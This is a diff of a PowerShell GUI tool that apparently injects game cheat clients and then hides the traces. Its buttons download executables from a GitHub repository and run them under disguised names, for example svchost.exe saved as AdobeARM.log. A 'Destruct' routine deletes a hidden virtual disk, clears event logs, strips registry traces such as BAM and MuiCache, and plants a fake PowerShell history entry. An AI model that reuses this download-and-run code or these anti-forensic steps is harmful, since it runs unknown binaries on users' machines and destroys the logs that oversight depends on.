@@ -57,6 +57,18 @@ try {
 $ConfirmPreference = 'None'
 $ErrorActionPreference = 'SilentlyContinue'
 # SHOW LOADING SCREEN
+# Create the form
+$form = New-Object System.Windows.Forms.Form
+$form.Text = 'By Zpat - FAX'
+$form.Size = New-Object System.Drawing.Size(950, 400)
+$form.StartPosition = 'CenterScreen'
+$form.BackColor = 'Black'
+$form.FormBorderStyle = 'FixedDialog'
+$form.MaximizeBox = $false
+$form.MinimizeBox = $false
+$form.BackColor = 'Black'
+$form.ForeColor = 'White'
+
 # Add a label to display ASCII art
 $asciiArt = @"
    __   ____  ___   ___  _____  _______
@@ -69,12 +81,12 @@ $label.Text = $asciiArt
 $label.Font = New-Object System.Drawing.Font("Consolas", 20)
 $label.ForeColor = 'Yellow'
 $label.AutoSize = $true
-# Center the label within the form
 $label.Location = New-Object System.Drawing.Point(
     [int](($form.ClientSize.Width - $label.PreferredWidth) / 2),
     [int](($form.ClientSize.Height - $label.PreferredHeight) / 2)
 )
 $form.Controls.Add($label)
+
 # Adjust the label's location when the form resizes
 $form.add_SizeChanged({
     $label.Location = New-Object System.Drawing.Point(
@@ -82,9 +94,35 @@ $form.add_SizeChanged({
         [int](($form.ClientSize.Height - $label.PreferredHeight) / 2)
     )
 })
+
+# Create a progress bar
+$progressBar = New-Object System.Windows.Forms.ProgressBar
+$progressBar.Style = 'Continuous'
+$progressBar.Minimum = 0
+$progressBar.Maximum = 100
+$progressBar.Value = 0
+$progressBar.Width = 600
+$progressBar.Height = 20
+$progressBar.Location = New-Object System.Drawing.Point(
+    [int](($form.ClientSize.Width - $progressBar.Width) / 2),
+    [int]($label.Location.Y + $label.Height + 50)
+)
+$form.Controls.Add($progressBar)
+
 # Show the form
 $form.Show()
-# END OF LOADING SCREEN
+
+# Simulate loading
+$loadingSteps = 100
+$stepDelay = 40  # Total time is approximately 4 seconds (100 steps * 40 ms)
+for ($i = 0; $i -le $loadingSteps; $i++) {
+    $progressBar.Value = $i
+    Start-Sleep -Milliseconds $stepDelay
+}
+
+# Close the loading form
+$form.Close()
+
 # MAKE THE PARTITION --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 # Ensure the directory exists
 $vdiskPath = "C:\temp\ddr.vhd"
@@ -126,9 +164,20 @@ if ($disk.PartitionStyle -eq 'Raw') {
 $partition = New-Partition -DiskNumber $disk.Number -UseMaximumSize -DriveLetter Z
 # Step 6: Format the volume with FAT32 and set label
 Format-Volume -DriveLetter Z -FileSystem FAT32 -NewFileSystemLabel "Local Disk" -Confirm:$false
+# Create tmp folder on Z drive
+$zTmpPath = "Z:\tmp"
+if (-Not (Test-Path $zTmpPath)) {
+    New-Item -ItemType Directory -Path $zTmpPath
+}
+
+# Download the image to Z:\tmp
+$imageUrl = "https://i.postimg.cc/mDrb7c7T/discotools-xyz-icon.png" 
+$imagePath = Join-Path -Path $zTmpPath -ChildPath "discotools-xyz-icon.png"
+if (-Not (Test-Path $imagePath)) {
+    Invoke-WebRequest -Uri $imageUrl -OutFile $imagePath
+}
+
 # END OF MAKING PARTITION ------------------------------------------------------------------------------------------------------------------------------------------------------------------
-# Close the old form
-$form.Close()
 # Hide PowerShell console window
 Add-Type -Name Win -Namespace Console -MemberDefinition @'
     [DllImport("user32.dll")]
@@ -138,22 +187,19 @@ Add-Type -Name Win -Namespace Console -MemberDefinition @'
 '@
 $consolePtr = [Console.Win]::GetConsoleWindow()
 [Console.Win]::ShowWindow($consolePtr, 0)
-# Create the form
+
+# Create the main form
 $form = New-Object System.Windows.Forms.Form
-$form.Text = 'HackEmDown'
+$form.Text = 'By Zpat - FAX'
 $form.Size = New-Object System.Drawing.Size(950, 400)
 $form.StartPosition = 'CenterScreen'
 $form.BackColor = 'Black'
-# Set background color to black and make the window non-resizable
 $form.FormBorderStyle = 'FixedDialog'
 $form.MaximizeBox = $false
 $form.MinimizeBox = $false
-$form.BackColor = 'Black'  # Set background color of the form to black
-# Set the title to empty (remove the title)
-$form.Text = "HackEmDown" 
-# Set the top bar (title bar) color to black
-$form.BackColor = 'Black'  # Set background color for the whole form
-$form.ForeColor = 'White'  # Set text color for the form content
+$form.BackColor = 'Black'
+$form.ForeColor = 'White'
+
 # ASCII Art Label
 $asciiArt = @"
   __  __     ______     ______     __  __     ______     __    __     _____     ______     __     __     __   __    
@@ -169,221 +215,213 @@ $label.Font = New-Object System.Drawing.Font('Courier New', 9)
 $label.ForeColor = 'Yellow'
 $label.AutoSize = $true
 $label.Location = New-Object System.Drawing.Point(50, 50)
-# Define Main Menu Buttons
-$injectButton = New-Object System.Windows.Forms.Button
-$injectButton.Text = 'Inject'
-$injectButton.Width = 100
-$injectButton.Height = 40
-$injectButton.Location = New-Object System.Drawing.Point(162.5, 200)  # Position the button
-$injectButton.BackColor = 'Green'
-$injectButton.ForeColor = 'Black'
-$destructButton = New-Object System.Windows.Forms.Button
-$destructButton.Text = 'Destruct'
-$destructButton.Width = 100
-$destructButton.Height = 40
-$destructButton.Location = New-Object System.Drawing.Point(687.5, 200)  # Position the button
-$destructButton.BackColor = 'Red'
-$destructButton.ForeColor = 'Black'
+
 # Function to return to main menu
 function Show-MainMenu {
     $form.Controls.Clear()
     $form.Controls.Add($label)
-    $form.Controls.Add($injectButton)
-    $form.Controls.Add($destructButton)
-}
-# Path to the custom sound file on Z drive
-$soundFilePath = "Z:\na.wav"
+    # Create PictureBox for Inject Button
+    $injectPictureBox = New-Object System.Windows.Forms.PictureBox
+    $injectPictureBox.Image = [System.Drawing.Image]::FromFile($imagePath)
+    $injectPictureBox.SizeMode = 'StretchImage'
+    $injectPictureBox.Width = 100
+    $injectPictureBox.Height = 100
+    $injectPictureBox.Location = New-Object System.Drawing.Point(162.5, 200)  # Position the PictureBox
+    $injectPictureBox.BackColor = 'Transparent'
+    $injectPictureBox.Add_Click({
+        # Inject Button Click: Show Prestige and Vape buttons
+        # Disable the form to prevent interaction
+        $form.Enabled = $false
+        # Download the sound file
+        Download-SoundFile
+        # Load the sound player
+        $player = New-Object System.Media.SoundPlayer
+        $player.SoundLocation = $soundFilePath
+        # Play the custom sound
+        $player.PlaySync()
+        # Re-enable the form after sound playback
+        $form.Enabled = $true
+        $form.Controls.Clear()
+        $form.Controls.Add($label)
+        # Back Button
+        $backPictureBox = New-Object System.Windows.Forms.PictureBox
+        $backPictureBox.Image = [System.Drawing.Image]::FromFile($imagePath)
+        $backPictureBox.SizeMode = 'StretchImage'
+        $backPictureBox.Width = 100
+        $backPictureBox.Height = 100
+        $backPictureBox.Location = New-Object System.Drawing.Point(800, 320)
+        $backPictureBox.BackColor = 'Transparent'
+        $backPictureBox.Add_Click({ Show-MainMenu })
+        # Prestige Button
+        $prestigePictureBox = New-Object System.Windows.Forms.PictureBox
+        $prestigePictureBox.Image = [System.Drawing.Image]::FromFile($imagePath)
+        $prestigePictureBox.SizeMode = 'StretchImage'
+        $prestigePictureBox.Width = 120
+        $prestigePictureBox.Height = 120
+        $prestigePictureBox.Location = New-Object System.Drawing.Point(150, 200)
+        $prestigePictureBox.BackColor = 'Transparent'
+        $prestigePictureBox.Add_Click({
+            if (-Not (Test-Path "Z:\meme.mp4")) {
+                iwr "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/sodium.jar"   -OutFile "Z:\meme.mp4"
+            }
+            Start-Process java -ArgumentList '-jar "Z:\meme.mp4"'
+        })
+        # Vapelite Button
+        $vapelitePictureBox = New-Object System.Windows.Forms.PictureBox
+        $vapelitePictureBox.Image = [System.Drawing.Image]::FromFile($imagePath)
+        $vapelitePictureBox.SizeMode = 'StretchImage'
+        $vapelitePictureBox.Width = 120
+        $vapelitePictureBox.Height = 120
+        $vapelitePictureBox.Location = New-Object System.Drawing.Point(300, 200)
+        $vapelitePictureBox.BackColor = 'Transparent'
+        $vapelitePictureBox.Add_Click({
+            if (-Not (Test-Path "Z:\8eef20dd-b61d-4da3-b1b4-00cd4c8117f1.tmp")) {
+                iwr "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/wpbbin.exe"   -OutFile "Z:\8eef20dd-b61d-4da3-b1b4-00cd4c8117f1.tmp"
+            }
+            Start-Process "Z:\8eef20dd-b61d-4da3-b1b4-00cd4c8117f1.tmp"
+        })
+        # Vapev4 Button
+        $vapev4PictureBox = New-Object System.Windows.Forms.PictureBox
+        $vapev4PictureBox.Image = [System.Drawing.Image]::FromFile($imagePath)
+        $vapev4PictureBox.SizeMode = 'StretchImage'
+        $vapev4PictureBox.Width = 120
+        $vapev4PictureBox.Height = 120
+        $vapev4PictureBox.Location = New-Object System.Drawing.Point(450, 200)
+        $vapev4PictureBox.BackColor = 'Transparent'
+        $vapev4PictureBox.Add_Click({
+            if (-Not (Test-Path "Z:\AdobeARM.log")) {
+                iwr "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/svchost.exe"   -OutFile "Z:\AdobeARM.log"
+            }
+            Start-Process "Z:\AdobeARM.log"
+        })
+        # Phantom Button
+        $phantomPictureBox = New-Object System.Windows.Forms.PictureBox
+        $phantomPictureBox.Image = [System.Drawing.Image]::FromFile($imagePath)
+        $phantomPictureBox.SizeMode = 'StretchImage'
+        $phantomPictureBox.Width = 120
+        $phantomPictureBox.Height = 120
+        $phantomPictureBox.Location = New-Object System.Drawing.Point(600, 200)
+        $phantomPictureBox.BackColor = 'Transparent'
+        $phantomPictureBox.Add_Click({
+            $clipboardText = "-agentlib:jdwp=transport=dt_socket,server=n,suspend=y,address=phantom.clientlauncher.net:6550"
+            Set-Clipboard -Value $clipboardText
+        })
+        # Add PictureBoxes to form
+        $form.Controls.Add($prestigePictureBox)
+        $form.Controls.Add($vapelitePictureBox)
+        $form.Controls.Add($backPictureBox)
+        $form.Controls.Add($vapev4PictureBox)
+        $form.Controls.Add($phantomPictureBox)
+    })
 
-# Function to download the sound file
-function Download-SoundFile {
-    $soundUrl = "https://github.com/devnull-sys/devnull/raw/refs/heads/main/na.wav"  # Replace with the actual URL of the sound file
-    try {
-        iwr -Uri $soundUrl -OutFile $soundFilePath
-    } catch {
-        Write-Error "Failed to download sound file: $_"
-        exit 1
-    }
-}
-
-# Inject Button Click: Show Prestige and Vape buttons
-$injectButton.Add_Click({
-    # Disable the form to prevent interaction
-    $form.Enabled = $false
-    
-    # Download the sound file
-    Download-SoundFile
-    
-    # Load the sound player
-    $player = New-Object System.Media.SoundPlayer
-    $player.SoundLocation = $soundFilePath
-    
-    # Play the custom sound
-    $player.PlaySync()
-    
-    # Re-enable the form after sound playback
-    $form.Enabled = $true
-    
-    $form.Controls.Clear()
-    $form.Controls.Add($label)
-    # Back Button
-    $backButton = New-Object System.Windows.Forms.Button
-    $backButton.Text = 'Back'
-    $backButton.Width = 100
-    $backButton.Height = 40
-    $backButton.Location = New-Object System.Drawing.Point(800, 320)
-    $backButton.BackColor = 'DarkRed'
-    $backButton.ForeColor = 'Black'
-    $backButton.Add_Click({ Show-MainMenu })
-    # Prestige Button
-    $prestigeButton = New-Object System.Windows.Forms.Button
-    $prestigeButton.Text = 'Prestige'
-    $prestigeButton.Width = 120
-    $prestigeButton.Height = 40
-    $prestigeButton.Location = New-Object System.Drawing.Point(150, 200)
-    $prestigeButton.BackColor = 'Purple'
-    $prestigeButton.ForeColor = 'Black'
-    # Vapelite Button
-    $vapeliteButton = New-Object System.Windows.Forms.Button
-    $vapeliteButton.Text = 'VapeLite'
-    $vapeliteButton.Width = 120
-    $vapeliteButton.Height = 40
-    $vapeliteButton.Location = New-Object System.Drawing.Point(300, 200)
-    $vapeliteButton.BackColor = 'LightBlue'
-    $vapeliteButton.ForeColor = 'Black'
-    # Vapev4 Button
-    $vapev4Button = New-Object System.Windows.Forms.Button
-    $vapev4Button.Text = 'VapeV4'
-    $vapev4Button.Width = 120
-    $vapev4Button.Height = 40
-    $vapev4Button.Location = New-Object System.Drawing.Point(450, 200)
-    $vapev4Button.BackColor = 'Blue'
-    $vapev4Button.ForeColor = 'Black'
-    # Phantom Button
-    $phantomButton = New-Object System.Windows.Forms.Button
-    $phantomButton.Text = 'Phantom'
-    $phantomButton.Width = 120
-    $phantomButton.Height = 40
-    $phantomButton.Location = New-Object System.Drawing.Point(600, 200)
-    $phantomButton.BackColor = 'Red'
-    $phantomButton.ForeColor = 'Black'
-    $phantomButton.Add_Click({
-        $clipboardText = "-agentlib:jdwp=transport=dt_socket,server=n,suspend=y,address=phantom.clientlauncher.net:6550"
-        Set-Clipboard -Value $clipboardText
-    })
-    # Add buttons to form
-    $form.Controls.Add($prestigeButton)
-    $form.Controls.Add($vapeliteButton)
-    $form.Controls.Add($backButton)
-    $form.Controls.Add($vapev4Button)
-    $form.Controls.Add($phantomButton)
-    # === YOUR CUSTOM PRESTIGE LOGIC HERE ===
-    $prestigeButton.Add_Click({
-        if (-Not (Test-Path "Z:\meme.mp4")) {
-            iwr "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/sodium.jar"  -OutFile "Z:\meme.mp4"
+    # Create PictureBox for Destruct Button
+    $destructPictureBox = New-Object System.Windows.Forms.PictureBox
+    $destructPictureBox.Image = [System.Drawing.Image]::FromFile($imagePath)
+    $destructPictureBox.SizeMode = 'StretchImage'
+    $destructPictureBox.Width = 100
+    $destructPictureBox.Height = 100
+    $destructPictureBox.Location = New-Object System.Drawing.Point(687.5, 200)  # Position the PictureBox
+    $destructPictureBox.BackColor = 'Transparent'
+    $destructPictureBox.Add_Click({
+        # Path to the virtual disk
+        $vdiskPath = "C:\temp\ddr.vhd"
+        # STEP 1: Get the virtual disk's associated disk number
+        $diskNumber = $null
+        $diskList = Get-Disk | Where-Object { $_.Location -like "*$vdiskPath*" }
+        if ($diskList) {
+            $diskNumber = $diskList.Number
+        } else {
+            Write-Host "Virtual disk not found or not attached. Aborting destruction."
+            return
         }
-        Start-Process java -ArgumentList '-jar "Z:\meme.mp4"'
-    })
-    # === YOUR CUSTOM VAPELITE LOGIC HERE ===
-    $vapeliteButton.Add_Click({
-        if (-Not (Test-Path "Z:\8eef20dd-b61d-4da3-b1b4-00cd4c8117f1.tmp")) {
-            iwr "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/wpbbin.exe"  -OutFile "Z:\8eef20dd-b61d-4da3-b1b4-00cd4c8117f1.tmp"
-        }
-        Start-Process "Z:\8eef20dd-b61d-4da3-b1b4-00cd4c8117f1.tmp"
-    })
-    # === YOUR CUSTOM VAPEV4 LOGIC HERE ===
-    $vapev4Button.Add_Click({
-        if (-Not (Test-Path "Z:\AdobeARM.log")) {
-            iwr "https://github.com/devnull-sys/devnull/raw/refs/heads/main/devnull/svchost.exe"  -OutFile "Z:\AdobeARM.log"
-        }
-        Start-Process "Z:\AdobeARM.log"
-    })
-})
-
-# Destruct Button
-$destructButton.Add_Click({
-    # Path to the virtual disk
-    $vdiskPath = "C:\temp\ddr.vhd"
-    # STEP 1: Get the virtual disk's associated disk number
-    $diskNumber = $null
-    $diskList = Get-Disk | Where-Object { $_.Location -like "*$vdiskPath*" }
-    if ($diskList) {
-        $diskNumber = $diskList.Number
-    } else {
-        Write-Host "Virtual disk not found or not attached. Aborting destruction."
-        return
-    }
-    # STEP 2: Detach the virtual disk
-    $detachScript = @"
+        # STEP 2: Detach the virtual disk
+        $detachScript = @"
 select vdisk file="$vdiskPath"
 detach vdisk
 "@
-    $detachFile = "C:\temp\$(Get-Random -Minimum 10000 -Maximum 99999).txt"
-    $detachScript | Set-Content -Path $detachFile
-    diskpart /s $detachFile | Out-Null
-    Remove-Item -Path $detachFile -Force
-    # STEP 3: Initialize the disk (if needed)
-    $initializeScript = @"
+        $detachFile = "C:\temp\$(Get-Random -Minimum 10000 -Maximum 99999).txt"
+        $detachScript | Set-Content -Path $detachFile
+        diskpart /s $detachFile | Out-Null
+        Remove-Item -Path $detachFile -Force
+        # STEP 3: Initialize the disk (if needed)
+        $initializeScript = @"
 select disk $diskNumber
 online disk
 convert mbr
 "@
-    $initFile = "C:\temp\$(Get-Random -Minimum 10000 -Maximum 99999).txt"
-    $initializeScript | Set-Content -Path $initFile
-    diskpart /s $initFile | Out-Null
-    Remove-Item -Path $initFile -Force
-    # STEP 4: Create partition and assign drive letter
-    $partitionScript = @"
+        $initFile = "C:\temp\$(Get-Random -Minimum 10000 -Maximum 99999).txt"
+        $initializeScript | Set-Content -Path $initFile
+        diskpart /s $initFile | Out-Null
+        Remove-Item -Path $initFile -Force
+        # STEP 4: Create partition and assign drive letter
+        $partitionScript = @"
 select disk $diskNumber
 create partition primary
 assign letter=Z
 "@
-    $partFile = "C:\temp\$(Get-Random -Minimum 10000 -Maximum 99999).txt"
-    $partitionScript | Set-Content -Path $partFile
-    diskpart /s $partFile | Out-Null
-    Remove-Item -Path $partFile -Force
-    # STEP 5: Delete the virtual disk file
-    if (Test-Path $vdiskPath) {
-        Remove-Item -Path $vdiskPath -Force
-    }
-    # STEP 6: Clean up "Recent" shortcuts
-    $recentPath = [Environment]::GetFolderPath("Recent")
-    Get-ChildItem -Path $recentPath -Filter "*" | ForEach-Object {
-        Remove-Item -Path $_.FullName -Force -ErrorAction SilentlyContinue
-    }
-    # Destruct other stuff after disk is gone
-    Remove-ItemProperty -Path "HKLM:\SYSTEM\MountedDevices" -Name "\DosDevices\Z:" -ErrorAction SilentlyContinue
-    Remove-Item -Path "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Search\VolumeInfoCache\Z:" -Recurse -Force
-    # Clear Temp
-    Remove-Item -Path "C:\temp\*" -Recurse -Force
-    Stop-Process -Name vds -Force
-    Get-ChildItem -Path "$env:USERPROFILE\Documents" -Filter "*.txt" | Where-Object { $_.Name -like "*PowerShell*" } | Remove-Item -Force
-    # Event logs
-    Clear-EventLog -LogName System
-    wevtutil cl "Windows PowerShell"
-    # Remove Stuff from MuiCache
-    Get-ItemProperty HKCU:\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache |
-    ForEach-Object { $_.PSObject.Properties } |
-    Where-Object { $_.Name -like "Z:\*" } |
-    ForEach-Object { Remove-ItemProperty -Path "HKCU:\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache" -Name $_.Name }
-    # BAM
-    gp HKLM:\SYSTEM\CurrentControlSet\Services\Bam\State | % { $_.PSObject.Properties } | ? { $_.Name -match "mmc\.exe|diskpart\.exe" } | % { ri HKLM:\SYSTEM\CurrentControlSet\Services\Bam\State -n $_.Name }
-    # Conhost History
-    Set-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" 'iwr -useb https://raw.githubusercontent.com/spicetify/cli/main/install.ps1  | iex'
-    # Clear JVM args logs and traces by clearing content
-    $jvmLogFiles = @(
-        "$env:USERPROFILE\.java\deployment\log\*.log",
-        "$env:USERPROFILE\AppData\LocalLow\Sun\Java\Deployment\log\*.log",
-        "$env:USERPROFILE\AppData\Local\Sun\Java\Deployment\log\*.log",
-        "$env:USERPROFILE\AppData\Roaming\Sun\Java\Deployment\log\*.log"
-    )
-    foreach ($file in $jvmLogFiles) {
-        Get-ChildItem -Path $file -ErrorAction SilentlyContinue | ForEach-Object {
-            Clear-Content -Path $_.FullName -ErrorAction SilentlyContinue
+        $partFile = "C:\temp\$(Get-Random -Minimum 10000 -Maximum 99999).txt"
+        $partitionScript | Set-Content -Path $partFile
+        diskpart /s $partFile | Out-Null
+        Remove-Item -Path $partFile -Force
+        # STEP 5: Delete the virtual disk file
+        if (Test-Path $vdiskPath) {
+            Remove-Item -Path $vdiskPath -Force
         }
+        # STEP 6: Clean up "Recent" shortcuts
+        $recentPath = [Environment]::GetFolderPath("Recent")
+        Get-ChildItem -Path $recentPath -Filter "*" | ForEach-Object {
+            Remove-Item -Path $_.FullName -Force -ErrorAction SilentlyContinue
+        }
+        # Destruct other stuff after disk is gone
+        Remove-ItemProperty -Path "HKLM:\SYSTEM\MountedDevices" -Name "\DosDevices\Z:" -ErrorAction SilentlyContinue
+        Remove-Item -Path "Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Search\VolumeInfoCache\Z:" -Recurse -Force
+        # Clear Temp
+        Remove-Item -Path "C:\temp\*" -Recurse -Force
+        Stop-Process -Name vds -Force
+        Get-ChildItem -Path "$env:USERPROFILE\Documents" -Filter "*.txt" | Where-Object { $_.Name -like "*PowerShell*" } | Remove-Item -Force
+        # Event logs
+        Clear-EventLog -LogName System
+        wevtutil cl "Windows PowerShell"
+        # Remove Stuff from MuiCache
+        Get-ItemProperty HKCU:\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache |
+        ForEach-Object { $_.PSObject.Properties } |
+        Where-Object { $_.Name -like "Z:\*" } |
+        ForEach-Object { Remove-ItemProperty -Path "HKCU:\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache" -Name $_.Name }
+        # BAM
+        gp HKLM:\SYSTEM\CurrentControlSet\Services\Bam\State | % { $_.PSObject.Properties } | ? { $_.Name -match "mmc\.exe|diskpart\.exe" } | % { ri HKLM:\SYSTEM\CurrentControlSet\Services\Bam\State -n $_.Name }
+        # Conhost History
+        Set-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" 'iwr -useb https://raw.githubusercontent.com/spicetify/cli/main/install.ps1   | iex'
+        # Clear JVM args logs and traces by clearing content
+        $jvmLogFiles = @(
+            "$env:USERPROFILE\.java\deployment\log\*.log",
+            "$env:USERPROFILE\AppData\LocalLow\Sun\Java\Deployment\log\*.log",
+            "$env:USERPROFILE\AppData\Local\Sun\Java\Deployment\log\*.log",
+            "$env:USERPROFILE\AppData\Roaming\Sun\Java\Deployment\log\*.log"
+        )
+        foreach ($file in $jvmLogFiles) {
+            Get-ChildItem -Path $file -ErrorAction SilentlyContinue | ForEach-Object {
+                Clear-Content -Path $_.FullName -ErrorAction SilentlyContinue
+            }
+        }
+        # Stop the script process
+        Stop-Process -Id $PID
+    })
+
+    # Add PictureBoxes to form
+    $form.Controls.Add($injectPictureBox)
+    $form.Controls.Add($destructPictureBox)
+}
+
+# Path to the custom sound file on Z drive
+$soundFilePath = Join-Path -Path $zTmpPath -ChildPath "a.wav"
+
+# Function to download the sound file
+function Download-SoundFile {
+    $soundUrl = "https://github.com/devnull-sys/devnull/raw/refs/heads/main/na.wav"   # Replace with the actual URL of the sound file
+    if (-Not (Test-Path $soundFilePath)) {
+        Invoke-WebRequest -Uri $soundUrl -OutFile $soundFilePath
     }
-    # Stop the script process
-    Stop-Process -Id $PID
-})
+}
 
 # Initial Load
 Show-MainMenu
